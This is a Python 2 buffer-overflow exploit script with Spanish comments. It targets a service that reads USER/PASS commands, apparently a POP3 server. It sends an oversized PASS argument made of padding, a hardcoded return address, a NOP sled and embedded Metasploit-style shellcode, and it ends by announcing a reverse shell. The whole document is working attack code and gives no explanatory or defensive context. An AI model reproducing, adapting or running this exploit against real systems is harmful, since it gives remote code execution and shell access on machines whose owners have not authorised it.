import sys,socket
try:
    host = str(sys.argv[1])
    puerto = str(sys.argv[2])
except IndexError:
    print "USO : python %s <direccion_IP> <puerto>" %sys.argv[0]
    sys.exit()
#El shellcode siempre cambia , usa el generador de shellcode de metasploit.
shellcode = ("\xdb\xd6\xd9\x74\x24\xf4\xb8\xc8\x9b\x16\xe8\x5d\x31\xc9\xb1"
"\x52\x31\x45\x17\x83\xc5\x04\x03\x8d\x88\xf4\x1d\xf1\x47\x7a"
"\xdd\x09\x98\x1b\x57\xec\xa9\x1b\x03\x65\x99\xab\x47\x2b\x16"
"\x47\x05\xdf\xad\x25\x82\xd0\x06\x83\xf4\xdf\x97\xb8\xc5\x7e"
"\x14\xc3\x19\xa0\x25\x0c\x6c\xa1\x62\x71\x9d\xf3\x3b\xfd\x30"
"\xe3\x48\x4b\x89\x88\x03\x5d\x89\x6d\xd3\x5c\xb8\x20\x6f\x07"
"\x1a\xc3\xbc\x33\x13\xdb\xa1\x7e\xed\x50\x11\xf4\xec\xb0\x6b"
"\xf5\x43\xfd\x43\x04\x9d\x3a\x63\xf7\xe8\x32\x97\x8a\xea\x81"
"\xe5\x50\x7e\x11\x4d\x12\xd8\xfd\x6f\xf7\xbf\x76\x63\xbc\xb4"
"\xd0\x60\x43\x18\x6b\x9c\xc8\x9f\xbb\x14\x8a\xbb\x1f\x7c\x48"
"\xa5\x06\xd8\x3f\xda\x58\x83\xe0\x7e\x13\x2e\xf4\xf2\x7e\x27"
"\x39\x3f\x80\xb7\x55\x48\xf3\x85\xfa\xe2\x9b\xa5\x73\x2d\x5c"
"\xc9\xa9\x89\xf2\x34\x52\xea\xdb\xf2\x06\xba\x73\xd2\x26\x51"
"\x83\xdb\xf2\xf6\xd3\x73\xad\xb6\x83\x33\x1d\x5f\xc9\xbb\x42"
"\x7f\xf2\x11\xeb\xea\x09\xf2\xd4\x43\x11\x6c\xbd\x91\x11\x74"
"\xef\x1f\xf7\x1e\x1f\x76\xa0\xb6\x86\xd3\x3a\x26\x46\xce\x47"
"\x68\xcc\xfd\xb8\x27\x25\x8b\xaa\xd0\xc5\xc6\x90\x77\xd9\xfc"
"\xbc\x14\x48\x9b\x3c\x52\x71\x34\x6b\x33\x47\x4d\xf9\xa9\xfe"
"\xe7\x1f\x30\x66\xcf\x9b\xef\x5b\xce\x22\x7d\xe7\xf4\x34\xbb"
"\xe8\xb0\x60\x13\xbf\x6e\xde\xd5\x69\xc1\x88\x8f\xc6\x8b\x5c"
"\x49\x25\x0c\x1a\x56\x60\xfa\xc2\xe7\xdd\xbb\xfd\xc8\x89\x4b"
"\x86\x34\x2a\xb3\x5d\xfd\x4a\x56\x77\x08\xe3\xcf\x12\xb1\x6e"
"\xf0\xc9\xf6\x96\x73\xfb\x86\x6c\x6b\x8e\x83\x29\x2b\x63\xfe"
"\x22\xde\x83\xad\x43\xcb")
buffer = "A"*2606 + "\x8f\x35\x4a\x5f" +"\x90"*16 + shellcode
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,int(puerto)))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    data = s.recv(1024)
    s.close()
    print("Enhorabuena, Disfrute de su reverse shell happy hacking :) ")
except:
    print("Algo ha salido mal...")
    sys.exit()
